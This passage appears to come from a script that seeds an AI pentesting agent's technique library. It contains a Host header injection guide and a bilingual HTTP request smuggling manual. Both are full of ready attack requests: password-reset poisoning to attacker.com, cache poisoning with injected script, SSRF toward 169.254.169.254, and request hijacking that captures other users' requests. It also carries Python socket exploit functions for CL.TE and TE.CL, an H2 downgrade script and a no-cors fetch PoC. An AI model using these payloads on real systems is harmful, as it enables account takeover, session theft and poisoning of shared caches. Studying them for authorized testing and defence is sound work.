Check Burp Collaborator for incoming HTTP request with the reset token.

### Variants

- Some apps concatenate: `Host: target.com.attacker.com` → link becomes `https://target.com.attacker.com/reset?token=xxx`
- Some apps use only the port portion: `Host: target.com:@attacker.com` → parsed as `attacker.com` in some URL parsers

---

## 3. WEB CACHE POISONING VIA HOST

```
1. Attacker sends:
   GET / HTTP/1.1
   Host: attacker.com

2. If cache keys on URL path but NOT on Host header:
   → Response cached with attacker.com in generated links/content

3. Subsequent users requesting GET / receive the poisoned response
   → Links point to attacker.com, scripts load from attacker.com
```

**Key requirement**: Cache must not include Host header in cache key, but application must use Host in response body.

Test by sending two requests with different Host values and checking if the second request returns the first's Host in the response.

---

## 4. SSRF VIA HOST ROUTING

When a reverse proxy uses Host header to route to backends:

```
GET /api/internal HTTP/1.1
Host: internal-admin-panel.local

→ Reverse proxy routes request to internal-admin-panel.local
→ Attacker accesses internal service
```

Common in:
- Nginx `proxy_pass` based on `$host`
- Apache `ProxyPass` with virtual host routing
- Kubernetes Ingress controllers
- Cloud load balancers

---

## 5. VIRTUAL HOST BYPASS

Many servers host multiple applications on the same IP via virtual hosting:

```
Target:  Host: www.target.com  → public site
Hidden:  Host: admin.target.com → admin panel (not in public DNS)
Hidden:  Host: staging.target.com → staging environment
Hidden:  Host: localhost → server status page
```

### Discovery

```
1. Brute-force Host header with common vhost names:
   ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w vhosts.txt

2. Try special values:
   Host: localhost
   Host: 127.0.0.1
   Host: admin
   Host: internal
   Host: intranet

3. Compare response size/content to identify different vhosts
```

---

## 6. BYPASS TECHNIQUES WHEN HOST IS VALIDATED

### 6.1 Override Headers

Many frameworks/proxies trust these headers over the Host header:

| Header | Frameworks That Trust It |
|---|---|
| `X-Forwarded-Host` | Symfony, Laravel, Django (when `USE_X_FORWARDED_HOST=True`), Rails (behind proxy) |
| `X-Host` | Some custom proxy configurations |
| `X-Original-URL` | IIS with URL Rewrite module |
| `X-Rewrite-URL` | IIS with URL Rewrite module |
| `Forwarded: host=attacker.com` | RFC 7239 compliant proxies |
| `X-Forwarded-Server` | Apache mod_proxy |

Test all simultaneously:

```http
GET /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: /forgot-password
Forwarded: host=attacker.com
```

### 6.2 Absolute URL in Request Line

```http
GET http://attacker.com/path HTTP/1.1
Host: target.com
```

Per HTTP/1.1 spec (RFC 7230): if the request line contains an absolute URI, the Host header SHOULD be ignored. Some servers follow this, some don't — the mismatch between proxy and backend creates the vulnerability.

### 6.3 Double Host Header

```http
GET /path HTTP/1.1
Host: target.com
Host: attacker.com
```

Behavior varies:
- Some proxies validate first Host, app uses second
- Some servers concatenate: `target.com, attacker.com`
- RFC says: if both differ, return 400. Most servers don't.

### 6.4 Host with Port / Credentials

```http
Host: target.com:@attacker.com
Host: target.com:evil.com
Host: target.com#@attacker.com
Host: attacker.com%23@target.com
```

URL parsers may extract the "host" portion differently when credentials (`@`) or fragments (`#`) are present.

### 6.5 Trailing Dot

```http
Host: target.com.
```

DNS treats `target.com.` and `target.com` identically (trailing dot = FQDN). But Host validation may not strip the trailing dot → `target.com. ≠ target.com` in string comparison → bypass whitelist.

### 6.6 Tab / Space Injection

```http
Host: target.com\tattacker.com
Host: target.com attacker.com
```

Some parsers split on whitespace; the server may use `attacker.com` portion while validation checks `target.com` portion.

### 6.7 Wrap-Around / Enclosed Values

```http
Host: "attacker.com"
Host: <attacker.com>
```

Quoted or bracketed values may be stripped by the app but not by the validator.

---

## 7. FRAMEWORK-SPECIFIC BEHAVIOR

| Framework | Host Source | Gotcha |
|---|---|---|
| **PHP** | `$_SERVER['HTTP_HOST']` (raw header, directly injectable) | `SERVER_NAME` is safer only with `UseCanonicalName On` |
| **Django** | `HttpRequest.get_host()` checks X-Forwarded-Host first (if enabled) | `USE_X_FORWARDED_HOST=True` bypasses `ALLOWED_HOSTS` |
| **Rails** | `request.host` from Host header; trusts `X-Forwarded-Host` behind proxy | Rails 6+ `HostAuthorization` middleware mitigates |
| **Node/Express** | `req.hostname` / `req.headers.host`; with `trust proxy` uses X-Forwarded-Host | No built-in host validation |

---

## 8. CONNECTION-STATE ATTACKS

A sophisticated variant exploiting HTTP keep-alive:

```
Connection 1:
  Request 1: GET / HTTP/1.1    ← Valid Host: target.com
              Host: target.com     → Proxy validates, forwards, keeps connection open

  Request 2: GET /admin HTTP/1.1  ← Evil Host on SAME connection
              Host: evil.com       → Some proxies skip validation on subsequent requests
                                     (they validated the connection on first request)
```

This works against proxies that perform Host validation only on the first request of a keep-alive connection.

### Testing

```
1. Use Burp Repeater with "Connection: keep-alive"
2. Send normal request first
3. On same connection, send request with manipulated Host
4. Check if second request is processed differently
```

---

## 9. HOST HEADER ATTACK DECISION TREE

```
Application uses Host header in responses/behavior?
│
├── Test direct Host injection
│   ├── Change Host to attacker domain → reflected in response?
│   │   ├── YES → Check impact:
│   │   │   ├── In password reset emails? → PASSWORD RESET POISONING
│   │   │   ├── In cached responses? → WEB CACHE POISONING
│   │   │   ├── In redirects? → OPEN REDIRECT
│   │   │   └── In script/link URLs? → XSS VIA HOST
│   │   └── NO (400/403/different response) → Host is validated
│   │
│   └── Host validated? Try bypasses:
│       ├── X-Forwarded-Host header
│       ├── X-Host / X-Original-URL / Forwarded header
│       ├── Absolute URL in request line
│       ├── Double Host header
│       ├── Host: target.com:@attacker.com (URL parser confusion)
│       ├── Host: target.com. (trailing dot)
│       ├── Tab/space injection in Host value
│       └── Connection-state attack (valid first request, evil second)
│
├── Test virtual host enumeration
│   ├── Brute-force Host values against target IP
│   ├── Try: localhost, admin, staging, internal, intranet
│   └── Compare response sizes for different Host values
│
├── Test SSRF via Host routing
│   ├── Host: 127.0.0.1 → internal service?
│   ├── Host: internal-hostname.local → internal routing?
│   └── Host: 169.254.169.254 → cloud metadata?
│
└── No Host-based behavior found
    └── Check if app uses Host in server-side operations
        (email generation, webhook URLs, API callbacks)
```

---

## 10. TRICK NOTES — WHAT AI MODELS MISS

1. **Password reset poisoning doesn't require the victim to be logged in** — you request the reset, the victim just clicks the link. The token lands on your server.
2. **X-Forwarded-Host is the #1 missed bypass**: Most Host validation checks `Host` header but frameworks silently prefer `X-Forwarded-Host` when behind a proxy.
3. **Double Host header is protocol-valid but behavior-undefined**: RFC says reject with 400, but almost no server actually does this. The mismatch between proxy and app is the vulnerability.
4. **Absolute URI overrides Host per RFC**: `GET http://evil.com/path HTTP/1.1\nHost: target.com` — the spec says use the request-line URI. But not all implementations agree.
5. **Cache poisoning via Host requires the cache to exclude Host from the key**: Most CDNs include Host in the cache key. But custom Varnish/Nginx caches may not. Also test with `X-Forwarded-Host` as cache key differentiator.
6. **Connection-state attacks are rarely tested**: Automated scanners don't test keep-alive behavior. Manual testing via Burp Repeater's connection reuse is essential.
7. **DNS rebinding + Host attacks**: If you control DNS, point your domain to the target's IP → your domain resolves to their server → Host header says your domain, but request hits their server. Useful for bypassing IP-based access controls.
TECH_HTTP_HOST_HEADER_TEST_EOF

seed_rule techniques/http-smuggling-test.md <<'TECH_HTTP_SMUGGLING_TEST_EOF'
> 结构：上半原有是主线（CL.TE / TE.CL）；下半补充 + 文末附件加深 H2。先时间差确认再走私。
>
> 与 `src-value-hunting` 冲突时以 rules 为准。只能探到解析差、没有绕 WAF/劫持/投毒 → 默认不写。

## 一、原有知识库

# HTTP 请求走私测试手册

## 一、HTTP 请求走私原理

### 核心问题

前端服务器（CDN/负载均衡器）与后端服务器对 HTTP 请求边界的解析不一致。

```
客户端 → 前端服务器 → 后端服务器

前端: 用 Content-Length 判断请求结束
后端: 用 Transfer-Encoding 判断请求结束

结果: 前端认为是1个请求，后端认为是2个请求
     → 第2个请求被"走私"到后端
```

---

## 二、三种类型

### 2.1 CL.TE（Content-Length vs Transfer-Encoding）

**前端用 Content-Length，后端用 Transfer-Encoding**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**解析差异**:
- 前端: 读取 6 字节（`0\r\n\r\nG`），认为请求结束
- 后端: 看到 `Transfer-Encoding: chunked`，读取 `0\r\n\r\n`（结束标记），剩余 `G` 被当作下一个请求的开头

### 2.2 TE.CL（Transfer-Encoding vs Content-Length）

**前端用 Transfer-Encoding，后端用 Content-Length**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**解析差异**:
- 前端: 读取 chunked 编码直到 `0\r\n\r\n`，认为请求结束
- 后端: 只读取 4 字节（`5c\r\n`），剩余内容被当作下一个请求

### 2.3 TE.TE（Transfer-Encoding 混淆）

**两端都用 Transfer-Encoding，但可通过混淆绕过其中一端**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
...
0


```

**混淆方式**:
```
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked, x
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked
Transfer-encoding: chunked  (小写 e)
Transfer-Encoding : chunked  (冒号前有空格)
Transfer-Encoding: chunked   (末尾有空格)
Transfer-Encoding:[tab]chunked
```

---

## 三、检测方法

### 3.1 时间差检测

```python
import socket
import time

def detect_cl_te(host, port=443):
    """检测 CL.TE 走私"""
    
    # 构造走私请求
    smuggled = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )
    
    # 发送请求
    sock = socket.create_connection((host, port))
    if port == 443:
        import ssl
        sock = ssl.wrap_socket(sock)
    
    sock.sendall(smuggled.encode())
    
    # 立即发送第二个请求
    normal = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    sock.sendall(normal.encode())
    
    # 测量响应时间
    start = time.time()
    response = sock.recv(4096)
    elapsed = time.time() - start
    
    sock.close()
    
    # 如果响应延迟 > 10s，可能存在走私
    # 原因: 后端等待走私请求的剩余部分（"X" 后面的内容）
    if elapsed > 10:
        print(f"可能存在 CL.TE 走私（延迟 {elapsed:.2f}s）")
        return True
    
    return False
```

### 3.2 CL.TE 检测 Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

**预期行为**:
- 如果返回超时或 400 错误 → 可能存在 CL.TE
- 原因: 后端读取 chunked 编码，等待 `Q` 后面的数据

### 3.3 TE.CL 检测 Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**预期行为**:
- 如果返回超时 → 可能存在 TE.CL
- 原因: 后端读取 6 字节（`0\r\n\r\nX`），但前端已认为请求结束

### 3.4 smuggler.py 工具

```bash
# 安装
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -h

# 自动检测
python3 smuggler.py -u https://target.com/

# 指定检测类型
python3 smuggler.py -u https://target.com/ -t CL.TE
python3 smuggler.py -u https://target.com/ -t TE.CL
```

---

## 四、利用场景

### 4.1 绕过前端安全控制（WAF/ACL）

```http
POST /admin HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /admin/deleteUser HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

userId=123
```

**效果**: 前端 WAF 只看到 `POST /admin`（可能允许），但后端实际执行 `POST /admin/deleteUser`（敏感操作）

### 4.2 请求劫持（捕获其他用户的请求）

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: attacker.com
Content-Length: 500

x=
```

**效果**: 下一个用户的请求会被拼接到 `x=` 后面，发送到 `attacker.com`

### 4.3 缓存投毒

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /static/js/app.js HTTP/1.1
Host: target.com
X-Ignore: X

HTTP/1.1 200 OK
Content-Type: application/javascript

alert('XSS')
```

**效果**: 将恶意响应缓存到正常 URL（`/static/js/app.js`），所有用户访问时触发 XSS

### 4.4 反射型 XSS 升级为存储型

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: target.com

```

**效果**: 走私的请求触发反射型 XSS，响应被缓存，变成存储型 XSS

### 4.5 绕过认证

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /internal/admin HTTP/1.1
Host: localhost
Authorization: Bearer INTERNAL_TOKEN

```

**效果**: 走私请求从内部发起，绕过外部认证检查

---

## 五、HTTP/2 降级走私

### 5.1 H2.CL（HTTP/2 → HTTP/1.1 + Content-Length）

```python
import h2.connection
import socket
import ssl

def h2_smuggling():
    # 建立 HTTP/2 连接
    sock = socket.create_connection(('target.com', 443))
    sock = ssl.wrap_socket(sock)
    
    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    
    # 发送带有 Content-Length 的请求
    # HTTP/2 不应该有 Content-Length，但降级到 HTTP/1.1 时会保留
    headers = [
        (':method', 'POST'),
        (':path', '/'),
        (':authority', 'target.com'),
        (':scheme', 'https'),
        ('content-length', '100'),  # 恶意 Content-Length
    ]
    
    conn.send_headers(1, headers)
    conn.send_data(1, b'x' * 50)  # 只发送 50 字节
    
    sock.sendall(conn.data_to_send())
```

### 5.2 CRLF 注入在 HTTP/2 头部

```python
# HTTP/2 头部中注入 CRLF
headers = [
    (':method', 'GET'),
    (':path', '/'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    ('foo', 'bar\r\nTransfer-Encoding: chunked'),  # 注入
]

# 降级到 HTTP/1.1 时变成:
# GET / HTTP/1.1
# Host: target.com
# foo: bar
# Transfer-Encoding: chunked
```

---

## 六、实战 PoC

### 6.1 原始 Socket 发送

```python
import socket
import ssl

def send_smuggled_request(host, port, payload):
    """发送走私请求"""
    
    # 建立连接
    sock = socket.create_connection((host, port))
    if port == 443:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
    
    # 发送 payload
    sock.sendall(payload.encode())
    
    # 接收响应
    response = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except:
            break
    
    sock.close()
    return response.decode('utf-8', errors='ignore')

# CL.TE 走私示例
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)

response = send_smuggled_request('target.com', 443, payload)
print(response)
```

### 6.2 完整 CL.TE 利用

```python
def exploit_cl_te(host, port=443):
    """CL.TE 走私攻击"""
    
    # 构造走私请求（访问管理员接口）
    smuggled = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 150\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    
    sock = socket.create_connection((host, port))
    if port == 443:
        sock = ssl.wrap_socket(sock, server_hostname=host)
    
    # 发送走私请求
    sock.sendall(smuggled.encode())
    
    # 发送正常请求（会被拼接到走私请求后）
    normal = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    sock.sendall(normal.encode())
    
    # 接收响应
    response = sock.recv(8192).decode('utf-8', errors='ignore')
    sock.close()
    
    return response
```

### 6.3 完整 TE.CL 利用

```python
def exploit_te_cl(host, port=443):
    """TE.CL 走私攻击"""
    
    # 计算 chunked 编码长度
    smuggled_request = (
        "GPOST /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1"
    )
    
    chunk_size = hex(len(smuggled_request))[2:]  # 转16进制
    
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{chunk_size}\r\n"
        f"{smuggled_request}\r\n"
        "0\r\n"
        "\r\n"
    )
    
    sock = socket.create_connection((host, port))
    if port == 443:
        sock = ssl.wrap_socket(sock, server_hostname=host)
    
    sock.sendall(payload.encode())
    response = sock.recv(8192).decode('utf-8', errors='ignore')
    sock.close()
    
    return response
```

---

## 七、Burp Suite 测试

### HTTP Request Smuggler 插件

```
1. 安装: Burp → Extender → BApp Store → HTTP Request Smuggler
2. 使用: 右键请求 → Extensions → Smuggle probe
3. 查看结果: 插件自动测试 CL.TE, TE.CL, TE.TE
```

### 手动测试步骤

```
1. 抓取正常请求
2. 修改为走私 payload
3. 发送到 Repeater
4. 观察响应时间和内容
5. 如果超时或异常 → 可能存在走私
```

---

## 八、防护检测

```python
# 检测是否有走私防护

# 1. 请求规范化
# 特征: 同时存在 CL 和 TE 时，服务器拒绝请求（400 Bad Request）

# 2. 前后端一致性
# 特征: 前后端使用相同的解析逻辑

# 3. HTTP/2 强制
# 特征: 不支持 HTTP/1.1，强制使用 HTTP/2

# 4. 严格的头部验证
# 特征: 拒绝畸形的 Transfer-Encoding 头
```

---

## 十、注意事项

1. **测试环境**: 优先在测试环境测试，生产环境谨慎
2. **影响范围**: 走私可能影响其他用户，测试时注意
3. **PoC 证据**: 保存完整的请求和响应
4. **及时报告**: 发现走私漏洞后立即报告，不要深入利用

---

## 二、补充：request-smuggling

### request-smuggling

### HTTP Request Smuggling

## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.

---

## 1. CORE CONCEPT

**Definition**: two (or more) HTTP processing entities disagree on where request one ends and request two begins in the **same TCP/TLS stream**, allowing an attacker to include a **partial or full** second request inside one logical request.

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Difference from CRLF injection**: CRLF usually injects into **responses** or **header lines**; smuggling targets implementation differences in **RFC 7230 message framing** (`Content-Length` / `chunked`).

**High-value impact**: WAF rule bypass (smuggled body not visible in front-end request), hijacking other users' requests on shared-origin connections (queue poisoning), cache-poisoning assistance, and authentication-boundary confusion.

---

## 2. CL.TE VULNERABILITIES

**Pattern**: front end trusts **`Content-Length`**; back end trusts **`Transfer-Encoding: chunked`**.

**Exact example** (same as §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both exist, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Back-end perspective**: the chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` starts with `METHOD SP` or another valid request prefix, it becomes a **smuggled request-line prefix**.

**Tuning**: if the target is sensitive to duplicate headers, casing, or spaces, minimally adjust `Transfer-Encoding` variants (see §4) while preserving semantics to match a combo where front end ignores TE and back end executes TE.

---

## 3. TE.CL VULNERABILITIES

**Pattern**: front end parses **chunked**; back end only reads **`Content-Length`** (or too-short CL).

**Intent**: front end treats the whole malicious byte stream as body; back end reads only CL length, leaving remaining bytes buffered to splice with later legitimate requests.

**Full TE.CL with embedded second request** (same family as §0; `Content-Length: 4` + first chunk-length line `35\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Explanation:

- **Back end (CL)**: reads only 4 bytes from the message body start -> `3` `5` `\r` `\n`, marks body complete, and leaves the remaining bytes in the TCP read buffer.
- **Front end (TE)**: parses full stream as chunked and forwards/consumes `GET /admin...` as body content of the **already-closed first request** (product-dependent); mismatch with back-end boundary interpretation forms TE.CL.

For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), chunk length is about `76` (hex `0x76` = 118 bytes); `Content-Length: 4` can still pin the back end to reading only the length line.

**Practical notes**: chunk length must be valid hex; second request must meet target expectations for Host, path, and session cookie; timing window and connection-reuse strategy determine whether you hit another user's request.

---

## 4. TE.TE VULNERABILITIES

**Pattern**: both front and back claim to process `Transfer-Encoding`, but differ on which TE value is effective or valid -> still producing equivalent desync where one side sees chunked and the other does not.

Use the following **8 obfuscation variants** to probe parser differentials (single-line display; `\t` means a real TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with real `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space at line start.)

```http
X: X
Transfer-Encoding: chunked
```
(Previous line value is `X` and next line starts with `Transfer-Encoding`: this uses **line continuation / lenient header parsing** so one hop may merge or split lines incorrectly; separator between `X` and `Transfer-Encoding` may be `\n` or `\r\n` depending on the target stack.)

```http
Transfer-Encoding
: chunked
```
(Field name and colon are on **different physical lines**; some parsers still treat it as valid `Transfer-Encoding: chunked`.)

**Strategy**: for each (front, back) pair, enumerate which side accepts each variant as `chunked`, then map to equivalent CL.TE or TE.CL using §2/§3.

---

## 5. HTTP/2 REQUEST SMUGGLING

### H2 -> H1 Downgrade

Common scenario: edge supports HTTP/2 and origin uses HTTP/1.1. If implementation does not strictly normalize header fields and body boundaries, you may observe:

- incorrect pseudo-header to regular-header mapping order;
- forbidden headers (such as some `Connection` combinations) forwarded incorrectly;
- duplicate-header merge rules inconsistent with the origin.

### Pseudo-header / header-injection smuggling (concept payload)

Attack surface comes from downstream H1 parsers treating certain bytes as the **start of a new request**. A common research/CTF approach is to place near-request bytes inside header values that one layer ignores but another treats literally:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: if one hop keeps the full string in a header value and the next hop mis-splits during H1 reconstruction, parsing may start a new `GET / HTTP/1.1` at `\r\n\r\n`.

**Testing directions**:

- duplicate and case handling for `Transfer-Encoding` / `Content-Length` in H2 (H2 requires lowercase, but translation layers can fail);
- downgrade behavior when `:method` or `:path` includes abnormal characters;
- interactions between tunneling or extended CONNECT and smuggling.

---

## 6. CLIENT-SIDE DESYNC

**Scenario**: browser request-body handling differs from middleware/origin, or **`no-cors` + preflight exemptions** permit atypical messages that create queue effects similar to classic CL.TE/TE.CL (architecture-dependent).

**HEAD + GET chain**: some stacks historically mishandle HEAD response bodies, later pipelining, or connection reuse; validate with concrete browser versions and target proxy behavior.

**JavaScript PoC shape** (illustrative: set body to raw bytes containing `GET`, with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: browser security model limits direct readability; success often appears as side effects on other requests over the same connection or as abnormal server logs/behavior, not direct response reading. Evaluate with SOP, CORS, and extension/proxy factors.

---

## 7. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing-delta checks |
| **defparam/smuggler** (GitHub) | Python scripts for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quickly assemble raw CL.TE / TE.CL message templates |

**Usage advice**: first passively confirm a **front-end + origin** two-hop path, then select minimally disruptive probes, and lower concurrency in production.

---

## 8. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

### Advanced Reference


---


## 附件：H2_SMUGGLING_VARIANTS

### HTTP/2 Smuggling Variants & Advanced Desync Techniques


## 1. H2.CL — HTTP/2 Content-Length Desync

### 1.1 Concept

The front-end speaks HTTP/2 with the client and downgrades to HTTP/1.1 toward the back-end. HTTP/2 frames have their own length field (frame length), but the proxy may also forward a `content-length` header to the back-end. If these disagree, the back-end trusts `content-length` while the front-end trusts the H2 frame boundary.

### 1.2 Attack Flow

```
Client ──[HTTP/2]──> Front-end proxy ──[HTTP/1.1]──> Back-end

1. Client sends H2 POST with:
   - H2 DATA frame containing: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   - content-length header: 0

2. Front-end (H2): reads entire DATA frame as body of first request
   → forwards to back-end as HTTP/1.1 POST

3. Back-end (H1): sees content-length: 0
   → treats body as empty
   → remaining bytes become: "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   → parsed as second request
```

### 1.3 Byte-Level Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: target.example

```

The H2 DATA frame carries the entire body including the smuggled `GET /admin` request. The `content-length: 0` header tells the back-end the POST body is empty.

### 1.4 Confirming H2.CL

```
Step 1: Send H2 POST with content-length: 0 and smuggled prefix "G"
Step 2: Follow immediately with normal GET / on same connection
Step 3: If back-end sees "GGET / HTTP/1.1" → 405 or error → confirmed

Timing version:
- Smuggle "GET /sleep?delay=10 HTTP/1.1..." 
- Subsequent request on same connection delayed → confirmed
```

---

## 2. H2.TE — HTTP/2 Transfer-Encoding Desync

### 2.1 Concept

HTTP/2 specification forbids `transfer-encoding` in H2 frames. However, some front-end proxies don't strip it when downgrading to H1. If the back-end sees `transfer-encoding: chunked` in the downgraded H1 request, it uses chunked parsing while the front-end used H2 frame boundaries.

### 2.2 Attack Flow

```
Client ──[HTTP/2]──> Front-end proxy ──[HTTP/1.1]──> Back-end

1. Client sends H2 POST with:
   - transfer-encoding: chunked  (forbidden in H2, but proxy passes it through)
   - H2 DATA frame body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"

2. Front-end: ignores transfer-encoding (H2 doesn't use it)
   → forwards entire DATA frame as H1 body

3. Back-end: sees transfer-encoding: chunked
   → parses "0\r\n\r\n" as end-of-chunks
   → remaining bytes = smuggled request
```

### 2.3 Byte-Level Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example

```

### 2.4 Variations

Some proxies normalize the `transfer-encoding` header. Try obfuscations:

```http
transfer-encoding: chunked
Transfer-Encoding: chunked      (capitalized — H2 requires lowercase)
transfer-encoding: identity     (should be stripped but may pass)
transfer-encoding:  chunked     (extra space)
transfer-encoding: chunked\r\n  (trailing whitespace)
```

---

## 3. CL.0 — CONNECTION CLOSE DESYNC

### 3.1 Concept

CL.0 occurs when the back-end ignores the `content-length` header entirely and reads the body length as 0 — regardless of what `content-length` says. The remaining body bytes stay in the socket buffer for the next request.

Unlike CL.TE or TE.CL, CL.0 does NOT require `transfer-encoding`. It exploits endpoints that simply don't consume the body.

### 3.2 Vulnerable Conditions

- Endpoints that return a response before reading the full body (e.g., redirects, 301/302)
- Static file servers that ignore POST body
- Health-check endpoints
- Endpoints behind `Connection: close` that reuse the socket anyway

### 3.3 Attack Flow

```
1. Send POST to endpoint that ignores body:
   POST /redirect-page HTTP/1.1
   Host: target.example
   Content-Length: 30

   GET /admin HTTP/1.1
   X: x

